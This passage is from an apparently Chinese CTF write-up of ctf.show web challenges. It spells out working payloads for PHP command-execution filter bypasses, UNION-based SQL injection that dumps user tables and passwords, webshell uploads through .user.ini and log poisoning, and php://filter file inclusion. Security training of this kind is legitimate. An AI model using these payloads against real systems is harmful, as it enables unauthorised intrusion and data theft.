    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>viewport<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>width=device-width, initial-scale=1.0<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span>POST数据包POC<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://0bb2c3a2-2646-491d-80fa-52c6bee9decc.challenge.ctf.show/<span class="token punctuation">"</span></span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>post<span class="token punctuation">"</span></span> <span class="token attr-name">enctype</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>multipart/form-data<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
<span class="token comment">&lt;!--链接是当前打开的题目链接--></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>label</span> <span class="token attr-name">for</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>file<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>文件名：<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>label</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>file<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>file<span class="token punctuation">"</span></span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>file<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>提交<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>我们可以发送一个上传文件的POST包，此时PHP会将我们上传的文件保存在临时文件夹下，默认的文件名是&#x2F;tmp&#x2F;phpXXXXXX，文件名最后6个字符是随机的大小写字母。至于后面为什么要加[@-[],是为了匹配到文件的最后一个字母的大写</p>
<p>当然，php生成临时文件名是随机的，最后一个字符不一定是大写字母，不过多尝试几次也就行了。<br>构造poc执行命令</p>
<blockquote>
<p>?c&#x3D;.+&#x2F;???&#x2F;???[@-[]</p>
</blockquote>
<p>注：后面的[@-[]是linux下面的匹配符，是进行匹配的大写字母。<br><img src="https://img-blog.csdnimg.cn/6c9aefc34bb946dcb1acdc502ed23489.png" alt="55"></p>
<h3 id="web57"><a href="#web57" class="headerlink" title="web57"></a>web57</h3><p>这里的字母和数字都被过滤了，题目说传入一个36，就可以得到flag。<br><img src="https://img-blog.csdnimg.cn/cbc6e031f9034562a1fac4c51868d50f.png" alt="57">那应该怎么传入一个36呢？<br>因为是在shell环境下的，所以需要使用linux shell的一些特性：</p>
<p><code>$(())</code>代表做一次运算，因为里面为空，也表示值为0<br><code>$((~$(())))</code> 对0作取反运算，值为-1<br><code>$(($((~$(())))$((~$(())))))</code> -1-1，也就是(-1)+(-1)为-2，所以值为-2<br><code>$((~$(($((~$(())))$((~$(())))))))</code>再对-2做一次取反得到1，所以值为1<br>如果对取反不了解可以百度一下，这里给个容易记得式子，如果对a按位取反，则得到的结果为-(a+1)，也就是对0取反得到-1<br>那么最后只需要37个-1相加再取反即可。<br>写个脚本生成payload：</p>
<pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell"><span class="token keyword">data</span> = <span class="token string">"$((~$(("</span><span class="token operator">+</span><span class="token string">"$((~<span class="token function">$<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span></span>)))"</span><span class="token operator">*</span>37+<span class="token string">"))))"</span>
print<span class="token punctuation">(</span><span class="token keyword">data</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p><img src="https://img-blog.csdnimg.cn/1dfc1bd03f634f0a8ac2897860397df8.png" alt="57"><br>传参后查看源码：<br><img src="https://img-blog.csdnimg.cn/2229ad05e7d44402a9129cac3b7498bf.png" alt="57"></p>
<h3 id="web58"><a href="#web58" class="headerlink" title="web58"></a>web58</h3><p>这次是post传入一个c，不妨用蚁剑试试？</p>
<p><img src="https://img-blog.csdnimg.cn/d4deb1dd5ef34b2e8119e315fcb326aa.png" alt="58"><br><img src="https://img-blog.csdnimg.cn/b95d371722ed4cff845d0949b4ec7129.png" alt="58"><br><img src="https://img-blog.csdnimg.cn/9bdfc6036b5244c089d74c881fcdf78d.png" alt="58"></p>
<p><strong>方法二</strong><br>post传参：<br>传入<code>c=passthru(&quot;ls&quot;);``c=system(&quot;ls&quot;);</code>等，发现我试的系统命令都被过滤了。<br><img src="https://img-blog.csdnimg.cn/8067867549014691beb5f8863079e2d3.png" alt="58"><br>这里补充一些读取文件的函数的用法：</p>
<pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">highlight_file<span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
show_source<span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
print_r<span class="token punctuation">(</span>php_strip_whitespace<span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
print_r<span class="token punctuation">(</span>file_get_contents<span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
readfile<span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
print_r<span class="token punctuation">(</span>file<span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token operator">/</span><span class="token operator">/</span> var_dump
fread<span class="token punctuation">(</span>fopen<span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">,</span><span class="token string">"r"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token variable">$size</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
include<span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token operator">/</span><span class="token operator">/</span> 非php代码
include_once<span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token operator">/</span><span class="token operator">/</span> 非php代码
require<span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token operator">/</span><span class="token operator">/</span> 非php代码
require_once<span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token operator">/</span><span class="token operator">/</span> 非php代码
print_r<span class="token punctuation">(</span>fread<span class="token punctuation">(</span>popen<span class="token punctuation">(</span><span class="token string">"cat flag"</span><span class="token punctuation">,</span> <span class="token string">"r"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token variable">$size</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
print_r<span class="token punctuation">(</span>fgets<span class="token punctuation">(</span>fopen<span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">,</span> <span class="token string">"r"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token operator">/</span><span class="token operator">/</span> 读取一行
fpassthru<span class="token punctuation">(</span>fopen<span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">,</span> <span class="token string">"r"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token operator">/</span><span class="token operator">/</span> 从当前位置一直读取到 EOF
print_r<span class="token punctuation">(</span>fgetcsv<span class="token punctuation">(</span>fopen<span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">,</span><span class="token string">"r"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token variable">$size</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
print_r<span class="token punctuation">(</span>fgetss<span class="token punctuation">(</span>fopen<span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">,</span> <span class="token string">"r"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token operator">/</span><span class="token operator">/</span> 从文件指针中读取一行并过滤掉 HTML 标记
print_r<span class="token punctuation">(</span>fscanf<span class="token punctuation">(</span>fopen<span class="token punctuation">(</span><span class="token string">"flag"</span><span class="token punctuation">,</span> <span class="token string">"r"</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">"%s"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
print_r<span class="token punctuation">(</span>parse_ini_file<span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token operator">/</span><span class="token operator">/</span> 失败时返回 false <span class="token punctuation">,</span> 成功返回配置数组<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>我用一下<code>c=echo file_get_contents(&quot;flag.php&quot;);</code>，得到了flag。</p>
<h3 id="web59"><a href="#web59" class="headerlink" title="web59"></a>web59</h3><p>同上题，但这题<code>file_get_contents</code>被过滤了，我试了一下<code>c=show_source(&quot;flag.php&quot;);</code>得到flag。<br><img src="https://img-blog.csdnimg.cn/4f4ed1c363c54412be30562549fda20b.png" alt="59"><br>也可以使用include()文件包含:</p>
<pre class="line-numbers language-none"><code class="language-none">&#x2F;&#x2F;POST传入：
c&#x3D;echo include($_GET[1]);
&#x2F;&#x2F;url连接：
&#x2F;?1&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;flag.php<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<p>之后base64解密得到flag。</p>
<h3 id="web71"><a href="#web71" class="headerlink" title="web71"></a>web71</h3><p>刚打开看到<br><img src="https://img-blog.csdnimg.cn/56fd117279cc402ab4083d3e022ec80a.png" alt="71"><br>post传去一个试试，<code>c=include(&#39;flag.php&#39;);</code>，结果都被通配符占领了。<br><img src="https://img-blog.csdnimg.cn/bd4e04e75e79476db81a728aa3dbd6e8.png" alt="71"><br>为什么呢？参考wp之后发现大家的都是给出index.php。</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>

<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">ini_set</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'display_errors'</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">// 你们在炫技吗？</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token variable">$c</span><span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
        <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$s</span> <span class="token operator">=</span> <span class="token function">ob_get_contents</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">ob_end_clean</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">echo</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/[0-9]|[a-z]/i"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"?"</span><span class="token punctuation">,</span><span class="token variable">$s</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>
    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token delimiter important">?></span></span>
你要上天吗？<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>这样看的话[0-9][a-z]都被过滤了。怪不得</p>
<blockquote>
<p>$s &#x3D; ob_get_contents();&#x2F;&#x2F;得到缓冲区的数据。<br>ob_end_clean();&#x2F;&#x2F;会清除缓冲区的内容，并将缓冲区关闭，但不会输出内容。</p>
</blockquote>
<p>可以不让他执行后面的内容，这样就不会被过滤了。利用<code>exit();</code>直接停止后面的程序。然后执行<code>c=include(&#39;/flag.txt&#39;);exit();</code>拿到flag。<br><img src="https://img-blog.csdnimg.cn/689f068a3e7842b48af6b07256822c61.png" alt="71"></p>
<h4 id="知识点-1"><a href="#知识点-1" class="headerlink" title="知识点"></a>知识点</h4><p><a href="https://blog.csdn.net/qq_33862778/article/details/80787510?spm=1001.2101.3001.6650.3&utm_medium=distribute.pc_relevant.none-task-blog-2~default~CTRLIST~Rate-3-80787510-blog-20122145.pc_relevant_multi_platform_whitelistv4&depth_1-utm_source=distribute.pc_relevant.none-task-blog-2~default~CTRLIST~Rate-3-80787510-blog-20122145.pc_relevant_multi_platform_whitelistv4&utm_relevant_index=6">php中ob函数的用法</a></p>
<h2 id="SQL注入篇"><a href="#SQL注入篇" class="headerlink" title="SQL注入篇"></a>SQL注入篇</h2><h3 id="web171"><a href="#web171" class="headerlink" title="web171"></a>web171</h3><blockquote>
<p><code>//拼接sql语句查找指定ID用户 $sql = &quot;select username,password from user where username !=&#39;flag&#39; and id = &#39;&quot;.$_GET[&#39;id&#39;].&quot;&#39; limit 1;&quot;; </code></p>
</blockquote>
<p>这里会把输入的id以get的形式直接递交到后台和查询语句进行简单的字符串拼接的过程，同时根据这个题目的查询条件，可以猜测username为为flag的用户他的信息就是我们所需要的。<br>但是网页里所展示的24个用户并没有我们所需要的flag<br>这里主要的思路就是用or进行截断，然后or后面跟我们所需要查询的语句<br>‘我们传入的语句’<br>首先我们给前面一个查询语句一个不可能达成的条件去截断它，即-1’<br>然后用or加上我们所要查询的 or username &#x3D; ‘flag’.我们语句外面还有一个引号。所以我们不要最后一个引号<br>最后的语句就是这样 -1’ or username &#x3D; ‘flag<br><strong>方法二</strong><br>用order by判断字段，确认字段数为3<br><img src="https://img-blog.csdnimg.cn/e5cf7a706ab9414b8b4efa485c2b3698.png" alt="171"><img src="https://img-blog.csdnimg.cn/561caf246f524743916e4c290284d839.png" alt="171"><br>接着用联合注入爆出当前数据库的所有表名</p>
<pre><code>-1&#39; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema = database()--+
</code></pre>
<p>根据题目给的SQL语句判断，flag就在字段password里，且旁边对应的字段username值为flag，故构造payload直接查看flag</p>
<pre><code>-1&#39; union select 1,2,password from ctfshow_user where username = &#39;flag&#39; --+
</code></pre>
<p><img src="https://img-blog.csdnimg.cn/8d1fc8e46c754886bebd3bc063318f9f.png" alt="171"></p>
<h4 id="综上"><a href="#综上" class="headerlink" title="综上"></a>综上</h4><p>爆出有哪些位置可以进行输出数据<br><code>1&#39; order by 3--+</code></p>
<p>查看数据库名字<br><code>1&#39; union select 1,2,database()--+</code></p>
<p>爆破表名：<br><code>-1&#39; union select 1,2,group_concat(table_name) FROM information_schema.tables where table_schema=database()--+</code></p>
<p>爆破列名：<br><code>1&#39; union select 1,2,group_concat(column_name) FROM information_schema.columns where table_schema=database() and table_name=&#39;ctfshow_user&#39;--+</code></p>
<p>爆破数据：<br><code>1&#39; union select 1,2,group_concat(id,username,password) FROM ctfshow_user--+</code></p>
<h3 id="web172"><a href="#web172" class="headerlink" title="web172"></a>web172</h3><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"> <span class="token comment">//拼接sql语句查找指定ID用户</span>
$<span class="token keyword">sql</span> <span class="token operator">=</span> <span class="token string">"select username,password from user where username !='flag' and id = '"</span><span class="token punctuation">.</span>$_GET<span class="token punctuation">[</span><span class="token string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token string">"' limit 1;"</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>查看数据库名字</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token number">1</span>' <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment">--+</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://img-blog.csdnimg.cn/4c72f7bb235a43aabfc05f68a47b99b8.png" alt="172"><br>爆破表名：<br><code>-1&#39; union select 1,2,group_concat(table_name) FROM information_schema.tables where table_schema=database()--+</code><img src="https://img-blog.csdnimg.cn/cc679eeb3313400b8c2a585a7395b9d7.png" alt="172"><br>出现两个表名，有猫腻！继续往下做<br>爆破表（ctfshow_user）的列名：<br><code>1&#39; union select 1,2,group_concat(column_name) FROM information_schema.columns where table_schema=database() and table_name=&#39;ctfshow_user&#39;--+</code><br><img src="https://img-blog.csdnimg.cn/c47f98754ada4e5f89973323c64eea9a.png" alt="172"></p>
<p>爆破数据：<br><code>1&#39; union select 1,2,group_concat(id,username,password) FROM ctfshow_user--+</code><br><img src="https://img-blog.csdnimg.cn/e652af16a26a46b989ac1a6a87572daa.png" alt="172">或只查找密码<br><code>1&#39; union select 1,2,password FROM ctfshow_user--+</code><br><img src="https://img-blog.csdnimg.cn/b06dc2683d1c4bbf85eb0e874886d09f.png" alt="172"><br>或精准查找flag的密码<br><code>1&#39; union select 1,username,password FROM ctfshow_user where username =&#39;flag&#39;--+</code><br><img src="https://img-blog.csdnimg.cn/483e7992aec84c5f8801785f651f3ff5.png" alt="172"><br>看来flag应该在另一个表中。<br><img src="https://img-blog.csdnimg.cn/cc679eeb3313400b8c2a585a7395b9d7.png" alt="172">确实：<br><img src="https://img-blog.csdnimg.cn/2a990c58086647cc8f591556d9b90096.png" alt="172"></p>
<h2 id="文件上传篇"><a href="#文件上传篇" class="headerlink" title="文件上传篇"></a>文件上传篇</h2><h3 id="web153"><a href="#web153" class="headerlink" title="web153"></a>web153</h3><p>上传图片马抓包改后缀<br><img src="https://img-blog.csdnimg.cn/1e8ea89704a54df79708da76200c7d64.png" alt="1"><br>换了php5，phtml蚁剑连不上，很有可能是php5，phtml没有被解析成php文件执行。详情请参考<a href="https://www.dazhuanlan.com/vip_mmles/topics/1547397"> .htaccess 和.user.ini 配置文件妙用 </a><br>所以要上传一个.user.ini配置文件，因为该网站是nginxx系统</p>
<p>同样，上传png文件，burp抓包修改文件信息，文件名修改为.user.ini，内容添加<strong>auto_prepend_file&#x3D;1.png</strong>。再上传一个名为1.png的图片马即可</p>
<p><img src="https://img-blog.csdnimg.cn/1e185a3845754cbc86e795bf433dbd5c.png" alt="2"><br><img src="https://img-blog.csdnimg.cn/4d12a3b8aa684b9981b21fe50035dde1.png" alt="3"><br>最后访问**&#x2F;url&#x2F;upload&#x2F;index.php<strong>，用</strong>12&#x3D;system(‘cat &#x2F;var&#x2F;www&#x2F;html&#x2F;f*’);**输入命令获取flag就好</p>
<h3 id="web154"><a href="#web154" class="headerlink" title="web154"></a>web154</h3><p><img src="https://img-blog.csdnimg.cn/774a6099bce54cc2b80d994fa6ab641e.png" alt="1"><br>先上传木马图片，在上传.user.ini文件<br><img src="https://img-blog.csdnimg.cn/772c7be1ba234b79876564de940ce075.png" alt="2"><br><img src="https://img-blog.csdnimg.cn/f4c39dfc13344f92baaf74f1c1131fdb.png" alt="3"><br><img src="https://img-blog.csdnimg.cn/235addb3fca1469cb74c46fecab5ad69.png" alt="4"><br><img src="https://img-blog.csdnimg.cn/aa4c2da456f34dd3989d31231b939a1a.png" alt="5"><br>得到flag。</p>
<h3 id="web155"><a href="#web155" class="headerlink" title="web155"></a>web155</h3><p>上传普通文件是不行了，php大写为PHP显示上传成功<br><img src="https://img-blog.csdnimg.cn/f2885b09f69d4050b9e4700968b9b50b.png" alt="1"></p>
<p><img src="https://img-blog.csdnimg.cn/5642e7dad85e49399077a6ae2e1aa9be.png" alt="1"></p>
<h3 id="web156"><a href="#web156" class="headerlink" title="web156"></a>web156</h3><p>上一题的方法不能用了，可能是过滤了一些东西，采用二分法看看是哪里出问题了。<br><img src="https://img-blog.csdnimg.cn/ffa7b02671d74acfbb1625163c046b88.png" alt="1"><br><img src="https://img-blog.csdnimg.cn/21b518e23e66443893f63357d6fede21.png" alt="2"><br><img src="https://img-blog.csdnimg.cn/25f2dc51ac204ded8df334d61ac99fc9.png" alt="3"><br>看来是过滤了**[]<strong>，可以用</strong>{}**代替<br><img src="https://img-blog.csdnimg.cn/49012703e34c48dfbc3df84e4bbe7105.png" alt="3"><br>剩下步骤和上题一样。</p>
<h3 id="web157"><a href="#web157" class="headerlink" title="web157"></a>web157</h3><p>在url&#x2F;upload中查看源码可以看到有这样一段代码：<br>**function check($str){<br>           return !preg_match(‘&#x2F;php|{|[|;&#x2F;i’, $str);<br>       }**<br>       可以发现**php，{，[，;**被过滤了，那么一句话木马可以用**<?= system('cat ../*.ph*')?>**来代替。<br>       首先传入**.user.ini文件**写入**auto_append_file&#x3D;2.png**意思把同目录下的2.png文件当作php文件来执行。<br>       之后访问url&#x2F;upload&#x2F;查看源码便可得到flag。<br>       <img src="https://img-blog.csdnimg.cn/51c1859b5aef47c6bf2af0bbfc945edd.png" alt="1"></p>
<h3 id="web158"><a href="#web158" class="headerlink" title="web158"></a>web158</h3><p>相比于上题多过滤了log，不过没事，按上题做法也可以。依旧得到flag。</p>
<h3 id="web159"><a href="#web159" class="headerlink" title="web159"></a>web159</h3><p>发现system不能用了，如果用其他函数来代替system的话，还要用括号**()<strong>,发现</strong>（）**也被过滤了，因此在网上查了一下，</p>
<blockquote>
<p>php中，反引号**&#96;**可以用来执行终端命令。</p>
</blockquote>
<p>因此写入**<?= `cat fl*`?>**来执行命令。得到flag。</p>
<h3 id="web160"><a href="#web160" class="headerlink" title="web160"></a>web160</h3><p>经过测试发现反引号 &#96;和空格也被过滤了。看到别人的wp后才知道原来可以上传到日志里，但是log被过滤了。php里可以用**.<strong>来拼接log。知道sever为nginx,日志文件默认放在</strong>&#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log<strong>里。<br>所以有思路了。<br>首先上传</strong>.user.ini**，然后上传2.png文件写入<?=include"/var/lo"."g/niginx.access.lo"."g"?> 同时UA改为一句话木马。<br>稍后蚁剑连入url&#x2F;upload&#x2F;<br><img src="https://img-blog.csdnimg.cn/6a94f2203af149be8e487afe9fe74dd9.png" alt="1"><br>即可查找flag。<br><img src="https://img-blog.csdnimg.cn/e4b85afb4d144b9785e81f42c99bc3f2.png" alt="2"></p>
<h3 id="web161"><a href="#web161" class="headerlink" title="web161"></a>web161</h3><p>与上题不同的是进行了文件头的验证，只需在文件头加上GIF89a，其他和上题一样。<br>蚁剑连接得到flag。</p>
<h2 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h2><h3 id="web-78"><a href="#web-78" class="headerlink" title="web 78"></a>web 78</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>

<span class="token comment">/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-09-16 10:52:43
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-16 10:54:20
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

*/</span>


<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>
    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span> </span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>payload：<code>http://56337a28-b2ea-474e-b82d-03c38b2e75f1.challenge.ctf.show/?file=php://filter/convert.base64-encode/resource=flag.php</code></p>
<p>PD9waHANCg0KLyoNCiMgLSotIGNvZGluZzogdXRmLTggLSotDQojIEBBdXRob3I6IGgxeGENCiMgQERhdGU6ICAgMjAyMC0wOS0xNiAxMDo1NToxMQ0KIyBATGFzdCBNb2RpZmllZCBieTogICBoMXhhDQojIEBMYXN0IE1vZGlmaWVkIHRpbWU6IDIwMjAtMDktMTYgMTA6NTU6MjANCiMgQGVtYWlsOiBoMXhhQGN0ZmVyLmNvbQ0KIyBAbGluazogaHR0cHM6Ly9jdGZlci5jb20NCg0KKi8NCg0KDQokZmxhZz0iY3Rmc2hvd3tmYTljNGExYS01NzE1LTQwOGEtYWU0Yy00ZGU2NzRiM2M4YzZ9Ijs&#x3D;<br>解密得到flag：ctfshow{fa9c4a1a-5715-408a-ae4c-4de674b3c8c6}</p>
<h3 id="web-79"><a href="#web-79" class="headerlink" title="web 79"></a>web 79</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"> <span class="token php language-php"><span class="token delimiter important">&lt;?php</span>

<span class="token comment">/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-09-16 11:10:14
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-16 11:12:38
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

*/</span>


<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"php"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"???"</span><span class="token punctuation">,</span> <span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>
    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
